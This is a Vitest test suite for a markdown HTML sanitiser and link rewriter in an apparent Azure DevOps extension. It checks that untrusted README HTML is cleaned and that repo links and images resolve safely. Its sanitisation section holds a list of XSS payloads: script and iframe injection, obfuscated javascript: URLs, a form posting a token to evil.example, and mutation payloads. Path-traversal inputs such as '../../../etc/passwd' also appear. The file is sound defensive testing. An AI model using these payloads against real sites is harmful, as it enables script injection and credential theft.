// @vitest-environment jsdom
import { describe, it, expect } from "vitest";
import { prepareMarkdownHtml, MarkdownContext } from "./markdown";
import { parse, serialize } from "./browseState";

// Module under test: src/lib/markdown.ts, prepareMarkdownHtml(html, { owner, name, ref, dir }) -> { html, images }.
// The input is third-party HTML (GitHub's rendered markdown) that will be placed in the ADO extension frame, so the
// sanitisation tests are security-relevant. They inspect the parsed output DOM rather than searching strings, so
// harmless text such as a code sample that mentions "javascript:" does not cause false failures.
// In-hub links are checked via browseState.parse/serialize, so they depend on src/lib/browseState.ts as well.

const ctx: MarkdownContext = { owner: "acme", name: "web", ref: "feature/x", dir: "docs" };
const REPO = "acme/web";
const REF = "feature/x";

const dom = (html: string): HTMLElement => new DOMParser().parseFromString(html, "text/html").body;
const run = (html: string, c: MarkdownContext = ctx) => {
  const out = prepareMarkdownHtml(html, c);
  return { ...out, root: dom(out.html) };
};
const hasDotDot = (p: string) => p.split("/").includes("..");

const FORBIDDEN = "script, iframe, object, embed, form, style, base";
/** Lists every way the output could run script or load active content. Empty means safe. */
function violations(root: HTMLElement): string[] {
  const found: string[] = [];
  root.querySelectorAll(FORBIDDEN).forEach((el) => found.push(`forbidden element <${el.tagName.toLowerCase()}>`));
  root.querySelectorAll("*").forEach((el) => {
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      // Strip whitespace and control characters, which browsers ignore inside URL schemes.
      const value = attr.value.replace(/[\u0000- ]/g, "").toLowerCase();
      if (name.startsWith("on")) found.push(`event handler ${attr.name} on <${el.tagName.toLowerCase()}>`);
      if (name === "srcdoc") found.push(`srcdoc on <${el.tagName.toLowerCase()}>`);
      if (value.startsWith("javascript:") || value.startsWith("vbscript:")) found.push(`${attr.name}="${attr.value}" on <${el.tagName.toLowerCase()}>`);
      if (value.startsWith("data:") && !(el.tagName.toLowerCase() === "img" && value.startsWith("data:image/"))) {
        found.push(`${attr.name}="${attr.value.slice(0, 30)}" on <${el.tagName.toLowerCase()}>`);
      }
    }
  });
  return found;
}

describe("B-6: Sanitisation removes active content from GitHub-rendered HTML", () => {
  // prepareMarkdownHtml must never output scripts, event handlers, or javascript:/vbscript:/data: URLs.
  const payloads: [string, string][] = [
    ["script element", `<script>alert(1)</script><p>x</p>`],
    ["script with src", `<script src="https://evil.example/x.js"></script>`],
    ["iframe", `<iframe src="https://evil.example"></iframe>`],
    ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`],
    ["object", `<object data="x.swf"></object>`],
    ["embed", `<embed src="x.swf">`],
    ["form with action", `<form action="https://evil.example/steal"><input name="token"></form>`],
    ["button formaction", `<button formaction="javascript:alert(1)">go</button>`],
    ["style element", `<style>body{display:none}</style><p>x</p>`],
    ["base element", `<base href="https://evil.example/"><a href="x">x</a>`],
    ["svg onload", `<svg onload=alert(1)><circle r="5"/></svg>`],
    ["img onerror (external src)", `<img src="https://example.com/x.png" onerror="alert(1)">`],
    ["img onerror (src=x)", `<img src=x onerror=alert(1)>`],
    ["onclick on div", `<div onclick="alert(1)">x</div>`],
    ["ontoggle on details", `<details open ontoggle=alert(1)><summary>x</summary></details>`],
    ["onmouseover on a safe link", `<a href="https://example.com" onmouseover="alert(1)">x</a>`],
    ["javascript: href", `<a href="javascript:alert(1)">x</a>`],
    ["mixed-case JaVaScRiPt:", `<a href="JaVaScRiPt:alert(1)">x</a>`],
    ["leading whitespace javascript:", `<a href="  javascript:alert(1)">x</a>`],
    ["entity-encoded javascript&#58;", `<a href="javascript&#58;alert(1)">x</a>`],
    ["entity-encoded &#x6A;avascript:", `<a href="&#x6A;avascript:alert(1)">x</a>`],
    ["tab inside java&#9;script:", `<a href="java&#9;script:alert(1)">x</a>`],
    ["javascript: img src", `<img src="javascript:alert(1)">`],
    ["vbscript: href", `<a href="VBScript:msgbox(1)">x</a>`],
    ["data:text/html href", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`],
    ["data:image href on a link (data only allowed on img)", `<a href="data:image/png;base64,AAAA">x</a>`],
    ["data:text/html img src", `<img src="data:text/html,<script>alert(1)</script>">`],
    ["svg xlink:href javascript:", `<svg><a xlink:href="javascript:alert(1)"><text y="10">x</text></a></svg>`],
    ["math xlink:href javascript:", `<math><maction actiontype="statusline#http://example.com" xlink:href="javascript:alert(1)">x</maction></math>`],
    ["noscript mutation payload", `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`],
  ];

  it.each(payloads)("neutralises: %s", (_label, html) => {
    const { root } = run(html);
    expect(violations(root), `Expected the output for payload [${html}] to contain no active content`).toEqual([]);
  });

  it("keeps harmless content that surrounds a stripped payload", () => {
    const { root } = run(`<p>keep me</p><script>alert(1)</script><a href="javascript:alert(1)">link text</a>`);
    expect(root.textContent, "Expected the paragraph text to survive").toContain("keep me");
    expect(root.textContent, "Expected the link text to survive even though its href is removed").toContain("link text");
    expect(root.textContent, "Expected the script body not to be left behind as text").not.toContain("alert(1)");
  });

  it("keeps an inline data:image/ URL on an img", () => {
    const src = "data:image/png;base64,iVBORw0KGgo=";
    const { root, images } = run(`<img src="${src}" alt="dot">`);
    const img = root.querySelector("img");
    expect(img?.getAttribute("src"), "Expected data:image/ to be allowed on img and left unchanged").toBe(src);
    expect(img?.hasAttribute("data-repo-path"), "Expected an inline image not to become a repo-path placeholder").toBe(false);
    expect(images, "Expected an inline image not to be listed for authenticated fetching").toEqual([]);
  });

  it("keeps ordinary GitHub-rendered structure", () => {
    const html =
      `<h1><a id="user-content-title" class="anchor" href="#title">#</a>Title</h1><p>Hello <strong>world</strong> <code>x</code></p>` +
      `<pre><code>npm i</code></pre><table><thead><tr><th>h</th></tr></thead><tbody><tr><td>cell</td></tr></tbody></table><ul><li>one</li></ul>`;
    const { root } = run(html);
    for (const sel of ["h1", "p strong", "pre code", "table th", "table td", "ul li"]) {
      expect(root.querySelector(sel), `Expected "${sel}" to survive sanitisation`).not.toBeNull();
    }
  });
});

describe("B-4/B-6: External http(s) links open in a new tab safely", () => {
  it.each(["https://example.com/page", "http://example.com/page"])("adds target=_blank and rel=noopener noreferrer to %s", (href) => {
    const a = run(`<a href="${href}">x</a>`).root.querySelector("a")!;
    expect(a.getAttribute("href"), "Expected the external href to be unchanged").toBe(href);
    expect(a.getAttribute("target"), "Expected target=_blank on an external link").toBe("_blank");
    const rel = (a.getAttribute("rel") ?? "").toLowerCase().split(/\s+/);
    expect(rel, "Expected rel to include noopener").toContain("noopener");
    expect(rel, "Expected rel to include noreferrer").toContain("noreferrer");
  });

  it("treats a GitHub link to another repository as external", () => {
    const a = run(`<a href="https://github.com/other/repo/blob/main/a.md">x</a>`).root.querySelector("a")!;
    expect(a.getAttribute("href"), "Expected a link to another repo to stay as it is").toBe("https://github.com/other/repo/blob/main/a.md");
    expect(a.getAttribute("target"), "Expected target=_blank for another repo's link").toBe("_blank");
  });

  it("treats a same-repo GitHub link that is not a blob or tree (an issue) as external", () => {
    const a = run(`<a href="https://github.com/acme/web/issues/1">x</a>`).root.querySelector("a")!;
    expect(a.getAttribute("href"), "Expected the issue link to stay as it is").toBe("https://github.com/acme/web/issues/1");
    expect(a.getAttribute("target"), "Expected target=_blank for a same-repo non-file link").toBe("_blank");
  });

  it("leaves mailto links as they are", () => {
    const a = run(`<a href="mailto:dev@example.com">mail</a>`).root.querySelector("a")!;
    expect(a.getAttribute("href"), "Expected a mailto link to be unchanged").toBe("mailto:dev@example.com");
  });
});

describe("B-4/B-6: Pure fragment links stay as they are", () => {
  it("leaves #install unchanged and does not open a new tab", () => {
    const a = run(`<a href="#install">Install</a>`).root.querySelector("a")!;
    expect(a.getAttribute("href"), "Expected '#install' to be left exactly as it is").toBe("#install");
    expect(a.getAttribute("target"), "Expected no target on an in-page link").toBeNull();
  });

  it("leaves a heading anchor link and its id alone", () => {
    const { root } = run(`<h2><a id="user-content-usage" class="anchor" href="#usage"></a>Usage</h2>`);
    expect(root.querySelector("a.anchor")?.getAttribute("href"), "Expected the heading anchor href to be unchanged").toBe("#usage");
  });
});

describe("B-4/B-6: Relative links to repo files become in-hub hash links", () => {
  // ctx.dir = "docs": paths resolve against the folder of the markdown file.
  const hubLink = (href: string, c: MarkdownContext = ctx) => {
    const a = run(`<a href="${href}">x</a>`, c).root.querySelector("a")!;
    const value = a.getAttribute("href") ?? "";
    return { a, value, state: parse(value) };
  };

  it("builds the link with browseState.serialize for a sibling file", () => {
    const { value, a } = hubLink("a.md");
    expect(value, "Expected 'a.md' in docs to become serialize({repo, ref, path: 'docs/a.md'})").toBe(serialize({ repo: REPO, ref: REF, path: "docs/a.md" }));
    expect(a.getAttribute("target"), "Expected in-hub links to open in the same frame").toBeNull();
  });

  it("resolves a relative path against dir", () => {
    expect(hubLink("guide/a.md").state, "Expected docs + guide/a.md").toEqual({ repo: REPO, ref: REF, path: "docs/guide/a.md" });
  });

  it("resolves ../ against dir", () => {
    expect(hubLink("../b.ts").state, "Expected ../b.ts from docs to be b.ts at the root").toEqual({ repo: REPO, ref: REF, path: "b.ts" });
  });

  it("resolves ./folder/ and drops the trailing slash", () => {
    expect(hubLink("./c/").state, "Expected ./c/ from docs to be the folder docs/c").toEqual({ repo: REPO, ref: REF, path: "docs/c" });
  });

  it("resolves from the repo root when dir is empty", () => {
    expect(hubLink("docs/a.md", { ...ctx, dir: "" }).state, "Expected docs/a.md at the root to stay docs/a.md").toEqual({ repo: REPO, ref: REF, path: "docs/a.md" });
  });

  it("decodes percent-encoding in the relative path", () => {
    expect(hubLink("My%20Doc.md").state.path, "Expected %20 to decode to a space in the repo path").toBe("docs/My Doc.md");
  });

  it("drops a #fragment from the repo path", () => {
    expect(hubLink("a.md#section").state, "Expected the fragment not to become part of the file path").toEqual({ repo: REPO, ref: REF, path: "docs/a.md" });
  });

  it("cannot escape the repo root with ../", () => {
    const { value, state } = hubLink("../../../etc/passwd");
    if (value === "") return; // rejecting the link entirely is acceptable only if no unsafe href remains
    expect(value.startsWith("#"), `Expected a hub hash link (or no href), got "${value}"`).toBe(true);
    expect(state.repo, "Expected the link to stay inside this repo").toBe(REPO);
    expect(state.path === undefined || !hasDotDot(state.path), `Expected no '..' in the path, got ${JSON.stringify(state.path)}`).toBe(true);
    expect([undefined, "etc/passwd"], `Expected the path to be clamped to the root, got ${JSON.stringify(state.path)}`).toContain(state.path);
  });

  it("converts an absolute GitHub blob link for this repo and ref", () => {
    expect(hubLink("https://github.com/acme/web/blob/feature/x/docs/a.md").state, "Expected the blob link to become an in-hub file link").toEqual({
      repo: REPO, ref: REF, path: "docs/a.md",
    });
  });

  it("converts an absolute GitHub tree link for this repo and ref", () => {
    expect(hubLink("https://github.com/acme/web/tree/feature/x/src").state, "Expected the tree link to become an in-hub folder link").toEqual({
      repo: REPO, ref: REF, path: "src",
    });
  });

  it("converts an absolute GitHub tree link for the root of this ref", () => {
    expect(hubLink("https://github.com/acme/web/tree/feature/x").state, "Expected the root tree link to become the repo root on this ref").toEqual({
      repo: REPO, ref: REF,
    });
  });
});

describe("B-4/B-6: Repo images become placeholders for an authenticated fetch", () => {
  it("replaces a relative src with data-repo-path and reports the resolved path", () => {
    const { root, images } = run(`<img src="img/logo.png" alt="Logo" title="The logo">`);
    const img = root.querySelector("img")!;
    expect(img.getAttribute("data-repo-path"), "Expected the path resolved against dir").toBe("docs/img/logo.png");
    expect(img.getAttribute("src"), "Expected src to be removed, so the browser does not request it unauthenticated").toBeNull();
    expect(img.getAttribute("alt"), "Expected alt text to be kept").toBe("Logo");
    expect(img.getAttribute("title"), "Expected title to be kept").toBe("The logo");
    expect(images, "Expected the resolved path in images").toEqual(["docs/img/logo.png"]);
  });

  it.each([
    ["../assets/a.png", "assets/a.png"],
    ["./x.png", "docs/x.png"],
    ["my%20pic.png", "docs/my pic.png"],
    ["logo.png?raw=true", "docs/logo.png"],
  ])("resolves %s to %s", (src, expected) => {
    const { root, images } = run(`<img src="${src}">`);
    expect(root.querySelector("img")?.getAttribute("data-repo-path"), `Expected ${src} to resolve to ${expected}`).toBe(expected);
    expect(images, "Expected the same path in images").toEqual([expected]);
  });

  it("resolves from the repo root when dir is empty", () => {
    const { images } = run(`<img src="img/a.png">`, { ...ctx, dir: "" });
    expect(images, "Expected img/a.png at the root").toEqual(["img/a.png"]);
  });

  it("treats a github.com raw URL for the same repo and ref as a repo image", () => {
    const { root, images } = run(`<img src="https://github.com/acme/web/raw/feature/x/assets/a.png">`);
    const img = root.querySelector("img")!;
    expect(img.getAttribute("data-repo-path"), "Expected the raw URL to resolve to the repo path").toBe("assets/a.png");
    expect(img.getAttribute("src"), "Expected src to be removed").toBeNull();
    expect(images, "Expected the path in images").toEqual(["assets/a.png"]);
  });

  it("treats a github.com blob URL (?raw=true) for the same repo and ref as a repo image", () => {
    const { root, images } = run(`<img src="https://github.com/acme/web/blob/feature/x/assets/a.png?raw=true">`);
    expect(root.querySelector("img")?.getAttribute("data-repo-path"), "Expected the blob URL to resolve to the repo path").toBe("assets/a.png");
    expect(images, "Expected the path in images").toEqual(["assets/a.png"]);
  });

  it("reports every distinct image, and gives each img its own placeholder", () => {
    const { root, images } = run(`<img src="a.png"><img src="b/c.png">`);
    expect(Array.from(root.querySelectorAll("img")).map((i) => i.getAttribute("data-repo-path")), "Expected a placeholder on each img").toEqual(["docs/a.png", "docs/b/c.png"]);
    expect(images, "Expected both paths in images").toContain("docs/a.png");
    expect(images, "Expected both paths in images").toContain("docs/b/c.png");
  });

  it.each([
    ["an external image", "https://example.com/a.png"],
    ["a camo-proxied image", "https://camo.githubusercontent.com/abc123/68747470733a2f2f6578616d706c652e636f6d2f612e706e67"],
    ["a raw URL for another repo", "https://github.com/other/repo/raw/main/a.png"],
  ])("leaves %s unchanged", (_label, src) => {
    const { root, images } = run(`<img src="${src}">`);
    const img = root.querySelector("img")!;
    expect(img.getAttribute("src"), "Expected the external src to be unchanged").toBe(src);
    expect(img.hasAttribute("data-repo-path"), "Expected no placeholder for an external image").toBe(false);
    expect(images, "Expected no entry in images for an external image").toEqual([]);
  });

  it("reports no images when there are none", () => {
    expect(run(`<p>no pictures</p>`).images, "Expected an empty images list").toEqual([]);
  });

  it("cannot resolve an image outside the repo root", () => {
    const { root, images } = run(`<img src="../../../secret.png">`);
    const img = root.querySelector("img");
    expect(images.every((p) => !hasDotDot(p) && !p.startsWith("/")), `Expected no '..' or leading slash in images, got ${JSON.stringify(images)}`).toBe(true);
    expect(img?.getAttribute("src") ?? null, "Expected no relative src left behind for the browser to resolve against the ADO host").toBeNull();
  });
});

describe("B-6 (security): extra sanitiser rules", () => {
  it("strips style attributes", () => {
    const { root } = run(`<p style="position:fixed;top:0;left:0;width:100%;height:100%">x</p><img src="https://example.com/a.png" style="width:1px">`);
    expect(root.querySelector("[style]"), "Expected no element to keep a style attribute").toBeNull();
    expect(root.textContent, "Expected the text to survive").toContain("x");
  });

  it.each([
    ["relative", `<img src="https://example.com/a.png" srcset="local.png 2x">`],
    ["same-repo raw", `<img src="https://example.com/a.png" srcset="https://github.com/acme/web/raw/feature/x/a.png 2x">`],
    ["root-absolute", `<img src="https://example.com/a.png" srcset="/a.png 2x">`],
  ])("strips a %s srcset on img", (_label, html) => {
    expect(run(html).root.querySelector("img")?.hasAttribute("srcset"), "Expected srcset to be removed").toBe(false);
  });

  it("leaves no srcset or relative source in a <picture>, and still processes its fallback img", () => {
    const { root, images } = run(`<picture><source media="(prefers-color-scheme: dark)" srcset="dark.png"><source srcset="https://github.com/acme/web/raw/feature/x/l.png"><img src="light.png"></picture>`);
    expect(root.querySelector("[srcset]"), "Expected no srcset anywhere").toBeNull();
    expect(root.querySelector("source[src]"), "Expected no source with src").toBeNull();
    expect(root.querySelector("img")?.getAttribute("src"), "Expected the fallback img not to keep a relative src").toBeNull();
    expect(images, "Expected the fallback img to be listed").toEqual(["docs/light.png"]);
  });

  it("keeps data:image/svg+xml on an img only", () => {
    const svg = "data:image/svg+xml;base64,PHN2Zy8+";
    const { root } = run(`<img src="${svg}"><a href="${svg}">l</a><picture><source srcset="${svg}"><img src="x.png"></picture>`);
    expect(root.querySelector("img")?.getAttribute("src"), "Expected the svg data URL kept on the first img").toBe(svg);
    expect(root.querySelector("a")?.hasAttribute("href"), "Expected the svg data URL removed from a link").toBe(false);
    expect(root.querySelector("source"), "Expected no source element left").toBeNull();
  });

  it("keeps only GitHub markdown class tokens, so README HTML can't borrow the host UI's classes", () => {
    const { root } = run(
      `<div class="bolt-portal-host absolute-fill depth-16 flex-column markdown-alert markdown-alert-note"><span class="pl-k bolt-page-white">x</span></div>`
    );
    const div = root.querySelector("div")!;
    for (const c of ["bolt-portal-host", "absolute-fill", "depth-16", "flex-column"]) expect(div.classList.contains(c), `Expected class ${c} to be stripped`).toBe(false);
    expect(div.classList.contains("markdown-alert-note"), "Expected markdown-alert-note to survive").toBe(true);
    expect(root.querySelector("span")?.getAttribute("class"), "Expected pl-k kept and bolt-page-white dropped").toBe("pl-k");
    expect(run(`<p class="bolt-portal-host">y</p>`).root.querySelector("p")?.hasAttribute("class"), "Expected an emptied class attribute to be removed").toBe(false);
  });

  it.each([
    ["map/area", `<map name="m"><area shape="default" href="https://evil.example"></map><img src="https://example.com/a.png" usemap="#m">`, "map, area"],
    ["dialog", `<dialog open><p>Sign in with GitHub</p></dialog>`, "dialog"],
  ])("removes %s", (_label, html, sel) => {
    const { root } = run(html);
    expect(root.querySelector(sel), `Expected no ${sel} element`).toBeNull();
  });

  it("drops usemap from img", () => {
    expect(run(`<img src="https://example.com/a.png" usemap="#m">`).root.querySelector("img")?.hasAttribute("usemap"), "Expected usemap to be removed").toBe(false);
  });

  it("drops crossorigin and sets referrerpolicy and lazy loading on images", () => {
    const img = run(`<img src="https://example.com/a.png" crossorigin="use-credentials">`).root.querySelector("img")!;
    expect(img.hasAttribute("crossorigin"), "Expected crossorigin to be removed").toBe(false);
    expect(img.getAttribute("referrerpolicy"), "Expected no referrer to external image hosts").toBe("no-referrer");
    expect(img.getAttribute("loading"), "Expected lazy loading").toBe("lazy");
  });

  it("strips a data-repo-path supplied by the author", () => {
    const { root, images } = run(`<img data-repo-path="secrets/key.png" src="https://example.com/a.png">`);
    expect(root.querySelector("[data-repo-path]"), "Expected author-supplied data attributes to be removed").toBeNull();
    expect(images, "Expected nothing queued for fetching").toEqual([]);
  });
});

describe("B-4/B-6: Link and image decisions", () => {
  it("resolves a root-absolute link from the repo root", () => {
    expect(parse(run(`<a href="/docs/a.md">x</a>`).root.querySelector("a")!.getAttribute("href") ?? ""), "Expected /docs/a.md to be docs/a.md at the root, on this ref").toEqual({ repo: REPO, ref: REF, path: "docs/a.md" });
  });

  it("resolves a root-absolute image from the repo root", () => {
    expect(run(`<img src="/assets/a.png">`).images, "Expected /assets/a.png to be assets/a.png").toEqual(["assets/a.png"]);
  });

  it("navigates a same-repo link on another ref to that ref and path", () => {
    expect(parse(run(`<a href="https://github.com/acme/web/blob/main/docs/a.md">x</a>`).root.querySelector("a")!.getAttribute("href") ?? ""), "Expected the main ref, not the current one").toEqual({ repo: REPO, ref: "main", path: "docs/a.md" });
  });

  it("treats a raw.githubusercontent.com image for this repo and ref as a repo image", () => {
    const { root, images } = run(`<img src="https://raw.githubusercontent.com/acme/web/feature/x/assets/a.png">`);
    expect(root.querySelector("img")?.getAttribute("data-repo-path"), "Expected the repo path").toBe("assets/a.png");
    expect(root.querySelector("img")?.getAttribute("src"), "Expected src removed").toBeNull();
    expect(images, "Expected the path in images").toEqual(["assets/a.png"]);
  });

  it("leaves a raw.githubusercontent.com image for another repo alone", () => {
    const src = "https://raw.githubusercontent.com/other/web/main/a.png";
    const { root, images } = run(`<img src="${src}">`);
    expect(root.querySelector("img")?.getAttribute("src"), "Expected the other repo's image unchanged").toBe(src);
    expect(images, "Expected no images").toEqual([]);
  });
});
